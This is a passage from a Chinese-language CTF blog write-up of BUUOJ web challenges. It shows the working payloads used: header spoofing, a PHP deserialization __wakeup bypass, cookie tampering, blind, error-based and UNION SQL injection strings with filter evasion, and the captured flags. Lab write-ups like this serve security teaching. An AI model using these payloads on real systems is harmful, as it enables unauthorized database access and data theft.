alt="image-20210519204929008"></p><p>不是题目指定的浏览器，伪造UA头即可</p><p>将原来的UA复制下来，将浏览器改为Syclover,我这里是Chome</p><p><img src="image-20210519205137938.png" alt="image-20210519205137938"></p><p>访问</p><p><img src="image-20210519205209890.png" alt="image-20210519205209890"></p><p>只能本地访问，伪造ip地址即可，伪造XFF头</p><p><img src="image-20210519205319803.png" alt="image-20210519205319803"></p><p>本题结束</p><p><img src="image-20210519205334705.png" alt="image-20210519205334705"></p></blockquote><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><blockquote><p>访问就完了</p></blockquote><h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{c465ce01-d3c7-40de-a51b-9640ed18805b}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><h3 id="php反序列"><a href="#php反序列" class="headerlink" title="php反序列"></a>php反序列</h3><blockquote><p>进入后说有备份的习惯，常用的备份名试试，<a href="http://www.zip成功/">www.zip成功</a></p><p><img src="image-20210520171002623.png" alt="image-20210520171002623"></p><p>查看给我们的源码，有个flag.php文件，虽然我知道它是错的，可我还是想提 -&gt; 错误率up</p><p>线索在这里</p><p><img src="image-20210520171205303.png" alt="image-20210520171205303"><br>直接看class.php文件</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hello my friend~~sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知题目要求：</p><p><strong>username=admin,password=100</strong></p><p><strong>接着反序列化三部曲：找目标，找入口，操控可操控数据</strong></p></blockquote><ul><li><p>入口：</p><blockquote><pre class="line-numbers language-PHP"><code class="language-PHP">    public function __construct($username,$password){        $this->username = $username;        $this->password = $password;    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们可以直接操控username和password</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$Name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标达成，但题目使用__wakeup()函数将username恒定为guest，我们需要绕过它</p></blockquote></li><li><p>序列化分析：</p><blockquote><p>当一个类序列化时，类中的变量会被序列化为一串字节流</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若将这一串字节流再反序列化，将会得到</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">object</span><span class="token punctuation">(</span>Name<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (2) {</span>  <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"admin"</span>  <span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：</p><p>1、O:4:”Name”:2  表示类的相关属性，O代表类是一个object，4代表类名长度为4，”Name”表示类名</p><p>2、中说明序列化的变量/常量</p><p>​    s说明类型，5说明长度</p><p>本题含义为：</p><p>Name类中序列化了两个变量，分别是username，值为字符型的admin以及password，值为整形的100<br>这里为了方便理解，我将private属性改为了public属性，实际序列化的字符会有差别</p></blockquote></li><li><p>序列化</p><p>  可以看出序列化对象时，不会保存常量的值。对于父类中的变量和属性值，则会保留。</p><blockquote><p><code>unserialize()</code>反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</p><ul><li><code>__wakeup()</code>函数在对象被构建以后执行，所以$this-&gt;username的值不为空</li></ul></blockquote><p>  序列化时三个不同属性的变量结果不同</p><blockquote><p>Public属性序列化后格式:成员名</p><p>Private属性序列化后格式:%00类名%00成员名</p><p>Protected属性序列化后的格式:%00*%00成员名</p></blockquote><p>  除过public属性变量，其他属性想要得到完整的字节流（序列化字符串），都需要编码为base64</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$A</span> <span class="token operator">=</span> <span class="token string">'O:4:"Name":3:{s:8:"username";s:5:"admin";s:8:"password";i:100;s:8:"username";s:5:"guest";}'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>绕过__wakeup()</p><p>  回归正题，php5版本__wakeup()函数存在漏洞</p><p>  详情见：</p><p>  <a href="https://www.cnblogs.com/zy-king-karl/p/11436872.html">https://www.cnblogs.com/zy-king-karl/p/11436872.html</a></p><p>  简单说，自己把类的变量个数改高就行</p></li></ul><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$Name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//结果：Tzo0OiJOYW1lIjoyOntzOjE0OiIATmFtZQB1c2VybmFtZSI7czo1OiJhZG1pbiI7czoxNDoiAE5hbWUAcGFzc3dvcmQiO2k6MTAwO30=</span><span class="token comment" spellcheck="true">//解码：</span><span class="token comment" spellcheck="true">//O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</span><span class="token comment" spellcheck="true">//改为3，绕过__wakeup()：</span><span class="token comment" spellcheck="true">//O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get上传</p><p><img src="image-20210520200710648.png" alt="image-20210520200710648"></p></blockquote><h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{a084b447-1e32-40b2-8bdc-ab40e0e891ba}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><h3 id="POST传参加绕过限制"><a href="#POST传参加绕过限制" class="headerlink" title="POST传参加绕过限制"></a>POST传参加绕过限制</h3><blockquote><p>查看源码，有注释提示</p><p>​      <img src="image-20210521115301555.png" alt="image-20210521115301555"></p></blockquote><p>要求使用POST传参上传密码，密码需等于404但不能是数字</p><p>根据网页的描述，身份必须为Cuit</p><p><img src="image-20210521172436588.png" alt="image-20210521172436588"></p><p>抓包或者使用hackbar和POSTMAN均可</p><p>http请求中一般使用cookie或者Token代表身份</p><p>这里抓包查看，发现cookie有个user=0</p><p>改成Cuit,仍然没有绕过身份验证，想到0有错误的意思，改为1，成功绕过</p><p><img src="image-20210521173746936.png" alt="image-20210521173746936"></p><p>这里我用了POSTMAN，顺手练习一下POSTMAN的使用，我jian’yi</p><ul><li><p>输入密码</p><p>  密码这里有两个要求，值为404并且不是数字，那么想办法将404变成字符型即可</p><p>  我这里用的是添加空字符%00</p><p>  <img src="image-20210521174555374.png" alt="image-20210521174555374"></p><p>  密码正确，提示让我们买flag，直接money=9999999999999</p><p>  提示过长，这里我想到了ISCC2021的一道题</p><p>  直接9e9</p><p>  <img src="image-20210521181626971.png" alt="image-20210521181626971"></p><p>  成功</p></li></ul><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><blockquote><pre class="line-numbers language-php"><code class="language-php">header<span class="token punctuation">:</span>cookie<span class="token punctuation">:</span> uesr<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token number">404</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">&amp;</span>money<span class="token operator">=</span><span class="token number">9e9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{0557fab6-3496-4c4a-8195-933a6c0c49e0}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><h3 id="盲注之运算符注入"><a href="#盲注之运算符注入" class="headerlink" title="盲注之运算符注入"></a>盲注之运算符注入</h3><blockquote><p>本质上还是盲注，但本题绕过方式给我打开了新世界的大门，我称它为运算符注入</p></blockquote><p>测试闭合可以得知本题是数字型，过滤了空格，and,||，* 等之前我在注入中非常常有的符号</p><p>因为是数字型，我也没法用括号直接绕空格，纠结要不要看wp</p><p>因为想自己做，所以问了学长，学长直接**?id=1=(1=1)=1–+**</p><p>我？？？</p><p>灵感来了</p><p>php运算符并不局限于等号</p><p>还有异或，非，&lt;&gt;等，这些都可以作为注入的payload使用</p><blockquote><p>| &amp; ！不做过多解释，一般用不到</p></blockquote><blockquote><p>^  异或运算  ：只有两个值一对一错时返回1，否则返回0</p><p>&lt;&gt; ，同 != 两个值不相等时返回1，否则返回0</p><p>= 两个相等时返回1，否则返回0</p></blockquote><p>本题为数字型闭合，空格和if被过滤，所以使用此注入法盲注</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><blockquote><p>这里直接跑盲注脚本</p><p>库名</p><pre class="line-numbers language-python"><code class="language-python">code_select <span class="token operator">=</span> <span class="token string">'database()'</span>code <span class="token operator">=</span> <span class="token string">'(ascii(substr(('</span><span class="token operator">+</span>code_select<span class="token operator">+</span><span class="token string">'),'</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">',1))='</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">')--+'</span>            url <span class="token operator">=</span> <span class="token string">"http://5c906f0d-416f-4c4e-8344-d9a1907bac36.node3.buuoj.cn/search.php?id=1^"</span><span class="token operator">+</span>code<span class="token comment" spellcheck="true">#url</span><span class="token comment" spellcheck="true">#geek</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>表名</p><pre class="line-numbers language-python"><code class="language-python">code_select <span class="token operator">=</span> <span class="token string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema="geek")'</span>code <span class="token operator">=</span> <span class="token string">'(ascii(substr(('</span><span class="token operator">+</span>code_select<span class="token operator">+</span><span class="token string">'),'</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">',1))='</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">')--+'</span>url <span class="token operator">=</span> <span class="token string">"http://bc6a95f5-79ef-472a-9c12-847e970bdcdf.node3.buuoj.cn/search.php?id=1^"</span><span class="token operator">+</span>code<span class="token comment" spellcheck="true">#url</span><span class="token comment" spellcheck="true"># F1naI1y,Flaaaaag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>列名</p><pre class="line-numbers language-python"><code class="language-python">code_select <span class="token operator">=</span> <span class="token string">'select(group_concat(column_name))from(information_schema.columns)where(table_name="F1naI1y")'</span> code <span class="token operator">=</span> <span class="token string">'(ascii(substr(('</span><span class="token operator">+</span>code_select<span class="token operator">+</span><span class="token string">'),'</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">',1))='</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">')--+'</span>url <span class="token operator">=</span> <span class="token string">"http://bc6a95f5-79ef-472a-9c12-847e970bdcdf.node3.buuoj.cn/search.php?id=1^"</span><span class="token operator">+</span>code<span class="token comment" spellcheck="true">#url</span><span class="token comment" spellcheck="true">#id,username,password</span>code_select <span class="token operator">=</span> <span class="token string">'select(group_concat(column_name))from(information_schema.columns)where(table_name="Flaaaaag")'</span>code <span class="token operator">=</span> <span class="token string">'(ascii(substr(('</span><span class="token operator">+</span>code_select<span class="token operator">+</span><span class="token string">'),'</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">',1))='</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">')--+'</span>url <span class="token operator">=</span> <span class="token string">"http://bc6a95f5-79ef-472a-9c12-847e970bdcdf.node3.buuoj.cn/search.php?id=1^"</span><span class="token operator">+</span>code<span class="token comment" spellcheck="true">#url</span><span class="token comment" spellcheck="true"># id,fl4gawsl</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据</p><pre class="line-numbers language-python"><code class="language-python">code_select <span class="token operator">=</span> <span class="token string">'select(group_concat(fl4gawsl))from(geek.Flaaaaag)'</span>code <span class="token operator">=</span> <span class="token string">'(ascii(substr(('</span><span class="token operator">+</span>code_select<span class="token operator">+</span><span class="token string">'),'</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">',1))='</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">')--+'</span>url <span class="token operator">=</span> <span class="token string">"http://bc6a95f5-79ef-472a-9c12-847e970bdcdf.node3.buuoj.cn/search.php?id=1^"</span><span class="token operator">+</span>code<span class="token comment" spellcheck="true">#url</span><span class="token comment" spellcheck="true">#哈皮题目一堆数据，不贴了,flag在F1naI1y表最后面</span><span class="token comment" spellcheck="true">#可以直接查最后一个，所以</span>code_select <span class="token operator">=</span> <span class="token string">'select(group_concat(fl4gawsl))from(geek.Flaaaaag)where(id=9)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><blockquote><p>忘复制了，太长难的重跑，自己跑吧</p></blockquote><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><blockquote><p>本题为过滤了空格和等于的报错注入</p></blockquote><p>空格使用()绕过，等号使用like绕过</p><p>like用法同等号相同</p><ul><li><p>注库</p><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span> username<span class="token operator">=</span>admin<span class="token operator">&amp;</span> password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20210522202519701.png" alt="image-20210522202519701"></p></blockquote></li></ul><ul><li>注表</li></ul><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span>    username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>    password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string">"geek"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210522202730078.png" alt="image-20210522202730078"></p><ul><li>注列</li></ul><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>column_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string">"H4rDsq1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210522202914864.png" alt="image-20210522202914864"></p><p><strong>数据不全，把left换成right注一次，补全数据，这里substr被过滤</strong></p><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>column_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string">"H4rDsq1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210522202947214.png" alt="image-20210522202947214"></p><ul><li>注数据</li></ul><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210522203730259.png" alt="image-20210522203730259"></p><p>同上，right()补全</p><blockquote><pre class="line-numbers language-php"><code class="language-php">check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210522203917342.png" alt="image-20210522203917342"></p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><blockquote><p>见如上分析</p></blockquote><h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{fb2256ff-59ea-4da1-892e-058d5790dc8d}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><h3 id="简单的联合查询"><a href="#简单的联合查询" class="headerlink" title="简单的联合查询"></a>简单的联合查询</h3><blockquote><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//2220f5ea-6d14-4afe-968d-a231b7f532ed.node3.buuoj.cn/index.php?id=' union select 1,2,database() %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="image-20210526211750040.png" alt="image-20210526211750040"></p><p>没什么原理可说，干就完了</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><ul><li><p>爆库</p><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//2220f5ea-6d14-4afe-968d-a231b7f532ed.node3.buuoj.cn/index.php?id=' union select 1,2,group_concat(schema_name)from(information_schema.schemata)%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210526212126019.png" alt="image-20210526212126019"></p></li><li><p>爆表</p><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//2220f5ea-6d14-4afe-968d-a231b7f532ed.node3.buuoj.cn/index.php?id=' union select 1,(select group_concat(table_name)from(information_schema.tables) where table_schema="note"),3%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210526212308444.png" 